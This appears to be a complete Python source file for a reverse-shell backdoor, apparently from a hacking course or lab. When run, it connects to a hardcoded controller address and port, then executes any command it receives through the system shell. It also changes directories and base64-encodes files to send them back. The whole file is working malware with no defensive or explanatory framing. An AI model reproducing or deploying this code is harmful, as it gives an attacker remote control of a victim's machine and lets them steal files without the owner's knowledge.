#! /usr/bin/env python

import socket
import subprocess
import json
import os
import base64

class ReverseBackdoor:
    def __init__(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("172.20.10.5", 4447))

    def send_json_data(self,command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def receive_json_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self,command):
        command_output = subprocess.check_output(command,shell=True)
        return command_output

    def change_working_directory(self,path):
        try:
            os.chdir(path)
        except FileNotFoundError:
            exit(0)
        return ("[+] Changing Working Directory to "+ path).encode()

    def download_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.receive_json_data()
            if command[0]=="exit":
                self.connection.close()
                exit()
            elif command[0]=="cd" and len(command)>1:

                if "'" in command[1]:
                    path = ""
                    for path_with_space in command[1:]:
                        path = path + path_with_space
                        path = path.strip("'")
                        if path_with_space != command[-1]:
                            path = path+ " "

                    command_result = self.change_working_directory(path)
                else:
                    command_result = self.change_working_directory(command[1])
            elif command[0]=="download":
                command_result = self.download_file(command[1])

            else:
                command_result = self.execute_system_command(command)

            self.send_json_data(command_result.decode())


reverse_backdoor = ReverseBackdoor()
reverse_backdoor.run()